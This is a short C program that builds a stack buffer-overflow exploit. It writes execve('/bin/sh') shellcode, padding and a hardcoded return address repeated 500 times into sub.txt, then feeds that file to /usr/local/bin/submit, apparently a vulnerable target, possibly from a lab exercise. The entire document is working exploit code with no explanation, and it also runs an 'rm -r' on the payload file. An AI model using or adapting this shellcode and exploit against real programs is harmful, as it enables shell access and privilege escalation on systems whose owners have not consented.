#include<stdio.h>

int main(){
  FILE *fp;
  int i;
  char shellcode[] = "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
  char pending[] = "\xff\xff\xff";
  char addr[] = "\x48\xd5\xbf\xff";
  system("rm -r ./sub.txt");
  fp = fopen("./sub.txt", "a");
  if(fwrite((const void*)shellcode, sizeof(char), 61, fp) !=61){
	return -1;	
  }
  if(fwrite((const void*)pending, sizeof(char), 3, fp) != 3){ return -1; }
  for(i = 0;i<500;i++){
	  if(fwrite((const void*)addr, sizeof(char), 4, fp) !=4){ return -1;} }
  fclose(fp);
  system("/usr/local/bin/submit sub.txt");
  exit(0);  
}
